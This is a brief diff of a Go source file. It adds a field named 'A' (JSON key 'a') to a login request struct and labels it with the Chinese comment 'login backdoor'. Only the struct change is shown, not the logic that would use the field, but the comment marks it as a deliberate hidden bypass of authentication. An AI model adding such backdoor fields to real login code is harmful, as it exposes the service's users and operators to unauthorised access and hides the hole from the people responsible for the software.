@@ -8,6 +8,8 @@ import (
 type LoginReqVO struct {
 	Account  string `json:"account"`
 	Password string `json:"password"`
+	// 登录后门
+	A string `json:"a"`
 }
 
 type WeworkLoginReqVO struct {
